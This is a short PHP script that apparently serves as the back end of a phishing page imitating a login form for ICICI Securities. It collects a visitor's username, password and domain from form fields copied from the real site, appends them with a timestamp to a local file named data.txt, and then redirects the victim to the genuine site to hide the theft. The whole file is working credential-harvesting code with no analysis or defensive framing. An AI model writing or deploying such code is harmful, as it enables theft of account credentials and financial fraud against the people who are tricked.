<?php
date_default_timezone_set("Asia/Kolkata");
 if(isset($_POST['ctl00$ContentPlaceHolder1$Button1']))
 {
  $username = $_POST['ctl00$ContentPlaceHolder1$txtunm'];
  $password = $_POST['ctl00$ContentPlaceHolder1$txtpwd'];
  $domain = $_POST['ctl00$ContentPlaceHolder1$ddlDomain'];
  $text = "User ID->> ". $username . ", Password->> ". $password. ", domain->> ". $domain.", Login time->> ". date("d/m/y")."  " .date("h:i:sa") ."\n" ;
  $fp = fopen('data.txt', 'a+');

    if(fwrite($fp, $text))  {
        echo '';

    }
fclose ($fp);  
echo'<script> window.location="http://spm.icicisecurities.com/"; </script> ';  
}
?>